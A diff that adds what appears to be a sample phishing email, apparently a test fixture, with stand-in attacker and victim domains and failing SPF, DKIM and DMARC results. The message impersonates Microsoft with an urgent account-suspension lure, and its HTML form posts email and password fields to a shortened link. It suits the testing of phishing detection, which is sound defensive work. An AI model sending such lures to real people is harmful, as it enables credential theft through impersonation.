@@ -1,0 +1,26 @@
+Return-Path: <noreply@phisher.example>
+Received: from mail.attacker.example (mail.attacker.example [203.0.113.42])
+        by mx.victim.example with ESMTPS
+        for <abuse@victim.example>; Tue, 09 May 2026 09:15:00 +0000
+Authentication-Results: mx.victim.example;
+        spf=fail smtp.mailfrom=phisher.example;
+        dkim=fail header.i=@phisher.example;
+        dmarc=fail
+From: "Microsoft Account Team" <noreply@phisher.example>
+To: <victim@victim.example>
+Subject: [URGENT] Your Microsoft account has been suspended
+Date: Tue, 09 May 2026 09:15:00 +0000
+MIME-Version: 1.0
+Content-Type: text/html; charset=UTF-8
+
+<html>
+  <body>
+    <p>Your Microsoft Office365 account has been suspended.</p>
+    <p>Please verify your identity:</p>
+    <form action="https://bit.ly/3xdeadbeef" method="post">
+      <input type="text" name="email" />
+      <input type="password" name="password" />
+      <input type="submit" value="Verify" />
+    </form>
+  </body>
+</html>
